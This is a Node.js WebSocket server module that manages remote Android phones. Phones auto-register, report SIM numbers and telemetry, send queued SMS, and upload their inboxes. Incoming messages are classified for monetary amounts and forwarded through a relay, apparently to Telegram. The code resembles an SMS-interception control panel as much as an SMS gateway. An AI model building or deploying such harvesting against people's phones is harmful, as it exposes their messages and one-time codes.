"use strict";

const crypto = require("crypto");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");
const { ackOutbox } = require("./devices");

// ---------------------------------------------------------------- sessions

function parseCookies(header) {
  const out = {};
  for (const part of String(header || "").split(";")) {
    const i = part.indexOf("=");
    if (i < 0) continue;
    const k = part.slice(0, i).trim();
    if (!k) continue;
    let v = part.slice(i + 1).trim();
    try {
      v = decodeURIComponent(v);
    } catch (_) {}
    out[k] = v;
  }
  return out;
}

const b64 = (buf) => Buffer.from(buf).toString("base64").replace(/=+$/, "");

/**
 * cookie-session (cookies module) signature check.
 * Supported layouts:
 *   1. <name> + <name>.sig   -> sig = HMAC(value)
 *   2. <name> + <name>.sig   -> sig = HMAC("<name>.<value>")
 *   3. inline signed value   -> "<value>.<sig>"
 */
function unsign(value, sig, name) {
  if (!value) return null;
  const secrets = [config.SESSION_SECRET, config.SESSION_SECRET_OLD].filter(Boolean);

  for (const secret of secrets) {
    if (sig) {
      const want = String(sig).replace(/=+$/, "");
      for (const input of [value, `${name}.${value}`]) {
        if (b64(crypto.createHmac("sha256", secret).update(input).digest()) === want) return value;
      }
    }
    const dot = value.lastIndexOf(".");
    if (dot > 0) {
      const v = value.slice(0, dot);
      const s = value.slice(dot + 1);
      if (b64(crypto.createHmac("sha256", secret).update(v).digest()) === s) return v;
    }
  }
  return null;
}

function decodeSession(raw) {
  if (!raw) return {};
  let s = String(raw).trim();
  if (s.startsWith("j:")) s = s.slice(2);

  for (const enc of ["base64", "base64url"]) {
    try {
      const j = JSON.parse(Buffer.from(s, enc).toString("utf8"));
      if (j && typeof j === "object") return j;
    } catch (_) {}
  }
  try {
    const j = JSON.parse(s);
    if (j && typeof j === "object") return j;
  } catch (_) {}
  return {};
}

function sessionFromReq(req) {
  const cookies = parseCookies(req.headers.cookie);
  const name = config.COOKIE_NAME;
  const raw = cookies[name];
  if (!raw) return {};
  const sig = cookies[`${name}.sig`];
  const unsigned = unsign(raw, sig, name);
  if (!unsigned) return {};
  return decodeSession(unsigned);
}

// ---------------------------------------------------------------- helpers

const ok = (ws) => ws && ws.readyState === 1;

function safeSend(ws, payload) {
  if (!ok(ws)) return false;
  try {
    ws.send(JSON.stringify(payload));
    return true;
  } catch (_) {
    return false;
  }
}

async function resolveAdmin(req, url) {
  const token = url.searchParams.get("token");
  let ident = (sessionFromReq(req) || {}).adminId || null;

  if (!ident && token) ident = auth.verifyToken(token);
  if (!ident) return null;

  const [role, name] = auth.splitIdent(ident);
  if (role === "admin") {
    if (!auth.adminMatch(name)) return null;
    return { role: "admin", name: auth.adminMatch(name) };
  }

  const doc = await u.keyDoc(name);
  if (!doc || !u.keyActive(doc)) return null;
  return { role: "key", name: doc.key || name, key_id: String(doc._id) };
}

// ------------------------------------------------------------- admin socket

async function adminSocket(ws, req) {
  const url = new URL(req.url, "http://x");

  let ident;
  try {
    ident = await resolveAdmin(req, url);
  } catch (_) {
    ident = null;
  }
  if (!ident) {
    try { ws.close(1008, "unauthorized"); } catch (_) {}
    return;
  }

  hub.adminHub.add(ws);

  let total = 0;
  try { total = await db.devices.countDocuments({}); } catch (_) {}

  safeSend(ws, {
    type: "hello",
    role: ident.role,
    online: hub.hub.onlineCount,
    devices: total,
    server_time: db.utcNow().toISOString(),
  });

  let lastPong = Date.now() / 1000;
  const ping = setInterval(() => {
    if (!ok(ws)) return;
    if (Date.now() / 1000 - lastPong > config.WS_IDLE_TIMEOUT) {
      try { ws.close(4000, "idle"); } catch (_) {}
      return;
    }
    safeSend(ws, { type: "ping", ts: Math.floor(Date.now() / 1000) });
  }, Math.max(5, config.WS_PING_INTERVAL) * 1000);

  const cleanup = () => {
    clearInterval(ping);
    hub.adminHub.remove(ws);
  };

  ws.on("message", (raw) => {
    if (raw.length > config.MAX_WS_TEXT_BYTES) return;
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch (_) { return; }
    lastPong = Date.now() / 1000;

    const t = String(msg.type || "").toLowerCase();
    if (t === "ping") safeSend(ws, { type: "pong", ts: Math.floor(Date.now() / 1000) });
    else if (t === "pong") lastPong = Date.now() / 1000;
  });

  ws.on("close", cleanup);
  ws.on("error", cleanup);
}

// ------------------------------------------------------------ device socket

async function ensureDevice(registrationId, fallbackName) {
  const rh = u.hashValue(String(registrationId).trim());
  let device = await db.devices.findOne({ registration_id_hash: rh });

  if (!device) {
    // WS pe aaya par HTTP register nahi hua -> auto-provision
    const now = db.utcNow();
    try {
      const r = await db.devices.insertOne({
        registration_id: String(registrationId).trim(),
        registration_id_hash: rh,
        short_id: await u.nextDeviceShortId(),
        device_name: String(fallbackName || "Unknown").slice(0, 60),
        platform: "android",
        created_at: now,
        first_seen: now,
        last_seen: now,
        is_active: true,
        onboarded: false,
        install_state: "active",
        install_seq: 1,
        auto_sender: {
          enabled: false,
          channel_id: null,
          channel_title: null,
          sim_slots: [],
          tg_confirm: true,
          updated_at: now,
        },
      });
      device = await db.devices.findOne({ _id: r.insertedId });
      if (device) u.logEvent("device_autoprovision", { short_id: device.short_id }, String(device._id));
    } catch (_) {
      device = await db.devices.findOne({ registration_id_hash: rh });
    }
  }
  return device;
}

async function deviceSocket(ws, req, registrationId) {
  if (!registrationId) {
    try { ws.close(1008, "no registration id"); } catch (_) {}
    return;
  }

  let device;
  try {
    device = await ensureDevice(registrationId);
  } catch (_) {
    try { ws.close(1011, "db error"); } catch (_) {}
    return;
  }
  if (!device) {
    try { ws.close(1008, "device not found"); } catch (_) {}
    return;
  }

  const deviceId = String(device._id);
  await hub.hub.addDevice(deviceId, ws);
  hub.hub.externalHeartbeat = true; // hub loop sirf idle close karega

  const keepalive = setInterval(() => {
    if (!ok(ws)) return;
    const last = hub.hub.lastPong.get(deviceId) || Date.now() / 1000;
    if (Date.now() / 1000 - last > config.WS_IDLE_TIMEOUT) {
      try { ws.close(4000, "idle"); } catch (_) {}
    }
  }, Math.max(5, config.WS_PING_INTERVAL) * 1000);

  let lastSeenPush = 0;
  let closed = false;

  const cleanup = async () => {
    if (closed) return;
    closed = true;
    clearInterval(keepalive);
    await hub.hub.removeDevice(deviceId, ws);
    try {
      await db.devices.updateOne(
        { _id: device._id },
        { $set: { ws_connected: false, ws_disconnected_at: db.utcNow() } }
      );
    } catch (_) {}
    hub.broadcastDevice(deviceId, { ws_connected: false, status: "Offline" });
    u.logEvent("device_socket_close", null, deviceId);
  };

  ws.on("close", () => { cleanup().catch(() => {}); });
  ws.on("error", () => { cleanup().catch(() => {}); });

  try {
    await db.devices.updateOne(
      { _id: device._id },
      {
        $set: {
          ws_connected: true,
          ws_connected_at: db.utcNow(),
          last_seen: db.utcNow(),
          is_active: true,
          install_state: "active",
        },
      }
    );

    u.logEvent("device_socket_open", null, deviceId);
    hub.broadcastDevice(deviceId, {
      ws_connected: true,
      status: "Online",
      short_id: u.deviceShortId(device),
      last_seen: db.utcNow().toISOString(),
    });

    let pendingCount = 0;
    try {
      pendingCount = await db.outbox.countDocuments({ device_id: deviceId, status: { $ne: "sent" } });
    } catch (_) {}

    safeSend(ws, {
      type: "hello",
      server_time: db.utcNow().toISOString(),
      device_id: deviceId,
      short_id: u.deviceShortId(device),
      pending: pendingCount,
    });

    await hub.pushOutbox(deviceId);

    ws.on("message", async (raw) => {
      if (raw.length > config.MAX_WS_TEXT_BYTES) return;

      let msg;
      try { msg = JSON.parse(raw.toString()); } catch (_) { return; }

      const mtype = String(msg.type || "").toLowerCase();
      hub.hub.touch(deviceId);

      const now = Date.now() / 1000;
      if (now - lastSeenPush > 5) {
        lastSeenPush = now;
        db.devices.updateOne({ _id: device._id }, { $set: { last_seen: db.utcNow() } }).catch(() => {});
      }

      if (mtype === "ping" || mtype === "heartbeat") {
        safeSend(ws, { type: "pong", ts: Math.floor(now) });
        return;
      }
      if (mtype === "pong") return;

      if (mtype === "telemetry") {
        const data = msg.data && typeof msg.data === "object" ? msg.data : msg.telemetry;
        if (data && typeof data === "object") {
          await u.applyTelemetry(device, data).catch(() => {});
          hub.broadcastDevice(deviceId, {
            ws_connected: true,
            telemetry: data,
            last_seen: db.utcNow().toISOString(),
          });
        }
        return;
      }

      if (mtype === "command_result") {
        const data = msg.data && typeof msg.data === "object" ? msg.data : {};
        const action = String(msg.action || "").toLowerCase();
        if (["fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"].includes(action)) {
          const telemetry = data.telemetry && typeof data.telemetry === "object" ? data.telemetry : data;
          await u.applyTelemetry(device, telemetry).catch(() => {});
          if (telemetry.sim_number) {
            db.devices
              .updateOne({ _id: device._id }, { $set: { number_requested_at: null } })
              .catch(() => {});
          }
          hub.broadcastDevice(deviceId, { ws_connected: true, telemetry });
        }
        return;
      }

      if (mtype === "ack") {
        const itemId = msg.id;
        if (!itemId) return;
        let slot = parseInt(msg.sim_slot, 10);
        if (!Number.isFinite(slot)) slot = -1;
        try {
          await ackOutbox(String(itemId), String(msg.status || "sent"), String(msg.error || ""), slot);
        } catch (_) {}
        return;
      }

      if (mtype === "inbox") {
        for (const item of (msg.items || []).slice(0, 50)) {
          if (!item || typeof item !== "object") continue;
          const body = String(item.body || "").slice(0, config.MAX_SMS_BODY);
          const address = String(item.address || "").slice(0, 64);
          if (!body) continue;

          const direction = String(item.direction || "in").slice(0, 8);
          const { kind, amount, flow } = u.classifySms(address, body);

          const mid = await u.insertMessage({
            device_id: deviceId,
            device_name: device.device_name || "Unknown",
            direction,
            address,
            body,
            kind,
            amount,
            flow,
            status: "received",
            created_at: db.utcNow(),
          });

          if (mid) {
            hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null));
            if (direction === "in") hub.spawn(relay.relayForwardIncoming(device, address, body));
          }
        }
      }
    });
  } catch (err) {
    u.logEvent("device_socket_error", { error: String(err.message || err) }, deviceId);
    await cleanup().catch(() => {});
    try { ws.close(1011, "socket error"); } catch (_) {}
  }
}

module.exports = { adminSocket, deviceSocket, sessionFromReq, parseCookies, unsign };